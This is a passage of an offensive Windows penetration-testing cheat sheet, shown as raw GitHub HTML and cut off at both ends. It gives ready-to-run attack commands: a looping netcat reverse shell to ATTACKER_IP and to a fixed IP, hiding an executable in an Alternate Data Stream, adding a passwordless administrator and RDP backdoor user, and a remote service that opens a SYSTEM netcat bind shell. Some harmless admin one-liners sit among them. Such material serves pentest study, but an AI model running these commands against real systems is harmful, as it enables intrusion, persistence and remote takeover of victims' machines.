\u0026gt; benign.dll:evil.exe\n# delete ADS from file\npowershell remove-item -path /path/to/stream/file  -stream STREAMNAME\n\n# Check if OS is 64-bit\n(wmic os get OSArchitecture)[2]\n\n# Set terminal to display ansi-colors\nreg add HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1\npowershell Set-ItemProperty HKCU:\\Console VirtualTerminalLevel -Type DWORD 1\n\n# Current User Domain\necho %userdomain%\n\n# manually enabling PowerShell logging\nreg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f\nreg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f\nreg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e restart/reboot the machine now\u003c/span\u003e\nshutdown \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003er \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e infinite loop of reverse shell command every 60 seconds\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in cmd.exe\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003el \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003en \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e () \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e(\n  \u003cspan class=\"pl-smi\"\u003e@echo\u003c/span\u003e Replace with your command here...\n  .\\\u003cspan class=\"pl-c1\"\u003enc.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ee cmd ATTACKER_IP \u003cspan class=\"pl-c1\"\u003e443\u003c/span\u003e\n  timeout \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et \u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003enobreak \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e NUL\n)\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e same thing, in powershell\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e (\u003cspan class=\"pl-c1\"\u003e$true\u003c/span\u003e) {\u003cspan class=\"pl-c1\"\u003estart-process\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eNoNewWindow \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003efile .\\\u003cspan class=\"pl-c1\"\u003enc.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003earg \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e-e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e192.168.251.220\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e443\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e; \u003cspan class=\"pl-c1\"\u003eStart-Sleep\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eSeconds \u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e;}\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run regedit as SYSTEM (to view protected keys)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003epsexec.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ei \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003es \u003cspan class=\"pl-c1\"\u003eregedit.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check out HKLM\\Software\\Microsoft\\Windows NT\\Current Version\\Winlogon\\\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use `runas` to execute commands as another user\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e requires their password. \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Using `runas` this way requires a GUI session (RDP) to enter password in prompt.\u003c/span\u003e\nrunas \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:VICTIM cmd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e recursively list files with Alternate Data Streams\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003er \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e find \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e:\u003cspan class=\"pl-smi\"\u003e$DATA\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\ngci \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003erecurse \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e { gi \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.FullName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003estream \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e } \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e {(stream \u003cspan class=\"pl-k\"\u003e-ne\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e:$Data\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e (stream \u003cspan class=\"pl-k\"\u003e-ne\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eZone.Identifier\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)}\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e print Alternate Data Stream to console\u003c/span\u003e\npowershell \u003cspan class=\"pl-c1\"\u003eget-content\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003epath \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003epath\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eto\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003estream\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003efile  \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003estream STREAMNAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hide a file in an Alternate Data Stream\u003c/span\u003e\ntype \u003cspan class=\"pl-c1\"\u003eevil.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e benign.dll:\u003cspan class=\"pl-c1\"\u003eevil.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete ADS from file\u003c/span\u003e\npowershell \u003cspan class=\"pl-c1\"\u003eremove-item\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003epath \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003epath\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eto\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003estream\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003efile  \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003estream STREAMNAME\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check if OS is 64-bit\u003c/span\u003e\n(wmic os get OSArchitecture)[\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e]\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Set terminal to display ansi-colors\u003c/span\u003e\nreg add HKCU\\Console \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev VirtualTerminalLevel \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\npowershell \u003cspan class=\"pl-c1\"\u003eSet-ItemProperty\u003c/span\u003e HKCU:\\Console VirtualTerminalLevel \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eType DWORD \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Current User Domain\u003c/span\u003e\necho \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003euserdomain\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e manually enabling PowerShell logging\u003c/span\u003e\nreg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev EnableTranscripting \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e0x1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\nreg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev OutputDirectory \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_SZ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed C:\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\nreg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev EnableInvocationHeader \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e0x1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePowerShell:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# determine if current powershell process is 64-bit\n[System.Environment]::Is64BitProcess\n\n# determine if OS is 64-bit (various methods)\n[System.Environment]::Is64BitOperatingSystem\n(Get-WMIObject Win32_OperatingSystem).OSArchitecture\n(Get-WMIObject CIM_OperatingSystem).OSArchitecture\n(Get-WMIObject Win32_Processor).AddressWidth\n[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit\n\n# Base64 Decode\n[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String(\u0026quot;BASE64STRING\u0026quot;))\n\n# Base64 Encode\n[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\u0026quot;SOMETEXT\u0026quot;))\n\n# Zip a directory using Powershell 3.0 (Win8)\nAdd-Type -A 'System.IO.Compression.FileSystem';\n[IO.Compression.ZipFile]::CreateFromDirectory('C:\\folder', 'C:\\output.zip')\n\n# Zip a directory using Powershell 5.0 (Win10)\nCompress-Archive -Path 'C:\\folder' -DestinationPath 'C:\\output.zip'\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e determine if current powershell process is 64-bit\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eSystem.Environment\u003c/span\u003e]::Is64BitProcess\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e determine if OS is 64-bit (various methods)\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eSystem.Environment\u003c/span\u003e]::Is64BitOperatingSystem\n(\u003cspan class=\"pl-c1\"\u003eGet-WMIObject\u003c/span\u003e Win32_OperatingSystem).OSArchitecture\n(\u003cspan class=\"pl-c1\"\u003eGet-WMIObject\u003c/span\u003e CIM_OperatingSystem).OSArchitecture\n(\u003cspan class=\"pl-c1\"\u003eGet-WMIObject\u003c/span\u003e Win32_Processor).AddressWidth\n[\u003cspan class=\"pl-k\"\u003eSystem.IntPtr\u003c/span\u003e]::Size  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 4 = 32-bit, 8 = 64-bit\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Base64 Decode\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eSystem.Text.Encoding\u003c/span\u003e]::UTF8.GetSTring([\u003cspan class=\"pl-k\"\u003eSystem.convert\u003c/span\u003e]::FromBase64String(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eBASE64STRING\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e))\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Base64 Encode\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eConvert\u003c/span\u003e]::ToBase64String([\u003cspan class=\"pl-k\"\u003eSystem.Text.Encoding\u003c/span\u003e]::Unicode.GetBytes(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSOMETEXT\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e))\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Zip a directory using Powershell 3.0 (Win8)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eAdd-Type\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eA \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eSystem.IO.Compression.FileSystem\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n[\u003cspan class=\"pl-k\"\u003eIO.Compression.ZipFile\u003c/span\u003e]::CreateFromDirectory(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\folder\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\output.zip\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Zip a directory using Powershell 5.0 (Win10)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eCompress-Archive\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\folder\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eDestinationPath \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\output.zip\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6 Windows Persistence\u003c/h2\u003e\u003ca id=\"user-content-46-windows-persistence\" class=\"anchor\" aria-label=\"Permalink: 4.6 Windows Persistence\" href=\"#46-windows-persistence\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6.1 Add RDP User\u003c/h3\u003e\u003ca id=\"user-content-461-add-rdp-user\" class=\"anchor\" aria-label=\"Permalink: 4.6.1 Add RDP User\" href=\"#461-add-rdp-user\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"net user derp /add /passwordreq:no /y\nnet localgroup Administrators derp /add\nnet localgroup \u0026quot;Remote Desktop Users\u0026quot; derp /add\n# enable remote desktop / enable rdp\nreg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# delete user\nnet user derp /del\n# disable remote desktop\nreg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f\"\u003e\u003cpre\u003enet user derp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eadd \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003epasswordreq:no \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ey\nnet localgroup Administrators derp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eadd\nnet localgroup \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRemote Desktop Users\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e derp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eadd\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enable remote desktop / enable rdp\u003c/span\u003e\nreg add \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev fDenyTSConnections \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete user\u003c/span\u003e\nnet user derp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edel\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e disable remote desktop\u003c/span\u003e\nreg add \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev fDenyTSConnections \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eConnecting via RDP:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP\n# to attach a drive, use:\n# /drive:derp,/path/to/share\"\u003e\u003cpre\u003exfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to attach a drive, use:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /drive:derp,/path/to/share\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6.2 Remote SYSTEM Backdoor\u003c/h3\u003e\u003ca id=\"user-content-462-remote-system-backdoor\" class=\"anchor\" aria-label=\"Permalink: 4.6.2 Remote SYSTEM Backdoor\" href=\"#462-remote-system-backdoor\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThese techniques require having Admin credentials for the target machine.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.6.2.1 Backdoor Windows Services\u003c/h4\u003e\u003ca id=\"user-content-4621-backdoor-windows-services\" class=\"anchor\" aria-label=\"Permalink: 4.6.2.1 Backdoor Windows Services\" href=\"#4621-backdoor-windows-services\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eServices give you SYSTEM access.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# You must establish SMB session with admin creds first!!\nnet use \\\\VICTIM_NAME [PASSWORD] /u:Administrator\n# or mount an smb share on the target:\nnet use * \\\\VICTIM_NAME\\[share] [PASSWORD] /u:Administrator\n\n# open a backdoor netcat bind-shell with system privileges on a remote host\nsc \\\\VICTIM_NAME create derp binpath= \u0026quot;cmd.exe /k %temp%\\nc.exe -l -p 22222 -e cmd.exe\u0026quot;\n\n# start the service\nsc \\\\VICTIM_NAME start derp\n# or\nnet start derp\n\n# delete the service\nsc \\\\VICTIM_NAME delete derp\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e You must establish SMB session with admin creds first!!\u003c/span\u003e\nnet use \\\\VICTIM_NAME [\u003cspan class=\"pl-k\"\u003ePASSWORD\u003c/span\u003e] \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eu:Administrator\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or mount an smb share on the target:\u003c/span\u003e\nnet use \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \\\\VICTIM_NAME\\[\u003cspan class=\"pl-k\"\u003eshare\u003c/span\u003e] [\u003cspan class=\"pl-k\"\u003ePASSWORD\u003c/span\u003e] \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eu:Administrator\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e open a backdoor netcat bind-shell with system privileges on a remote host\u003c/span\u003e\nsc \\\\VICTIM_NAME create derp binpath\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd.exe /k %temp%\\nc.exe -l -p 22222 -e cmd.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start the service\u003c/span\u003e\nsc \\\\VICTIM_NAME start derp\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or\u003c/span\u003e\nnet start derp\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan 